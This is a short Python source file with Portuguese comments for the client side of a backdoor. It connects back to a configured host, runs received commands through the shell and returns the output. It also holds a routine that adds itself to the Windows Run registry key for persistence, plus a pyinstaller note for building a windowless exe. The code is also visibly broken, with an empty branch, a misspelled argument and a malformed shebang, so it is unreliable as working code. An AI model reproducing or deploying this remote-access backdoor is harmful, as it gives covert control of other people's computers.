#!/bin/bash/env python
# coding=UTF-8
# by Tarcisio marinho
# github.com/tarcisio-marinho

# código do cliente
# se cair -> reconecta
# ao reiniciar o pc -> reconecta

# comando[0] == 'cd' -> os.chdir()

import socket
import os
import time
import subprocess
import tempfile

nome_arquivo='backdoor.exe'
TEMPDIR = tempfile.gettempdir() #

# pyinstaller -F --clean -w backdoor.py -i icone.png

def persistencia():
    if(not os.getcwd() == TEMPDIR):
        subprocess.Popen('copy ' + nome_arquivo + ' ' + TEMPDIR, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)    # CRIAR THREADS PARA RODAR PROGRAMAS -> NÃO TER QUE ESPERAR O PROGRAMA FECHAR
        FNULL = open(os.devnull,'w')
        subprocess.Popen("REG ADD HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ /v backdoor /d " + TEMPDIR + "\\" + nome_arquivo, stdout=FNULL, sderr=FNULL)

def conecta(IP, PORT):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((IP, PORT))
        s.send('[+] Conectado :)')
        return s
    except socket.error as erro:
        return None

def executa(socket):
    while True:
        try:
            dados = socket.recv(1024)
            if(not dados): # servidor desconectou, recomeça
                return
            else:
                try:
                    if(dados=='upload'): # upload

                    elif(dados=='shell'): # shell
                        dados = ' '.join(dados)
                        comando = subprocess.Popen(dados, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)    # CRIAR THREADS PARA RODAR PROGRAMAS -> NÃO TER QUE ESPERAR O PROGRAMA FECHAR
                        retorno = comando.stdout.read() + comando.stderr.read()
                        socket.send(retorno)
                except:
                    return
        except: # algum erro ocorreu, recomeça
            return

def main():
    ip='127.0.0.1'
    porta=1025
    while True:
        conexao = conecta(ip, porta)
        if(conexao):
            executa(conexao)
        else:
            time.sleep(5)

if __name__=='__main__':
    #persistencia()
    main()
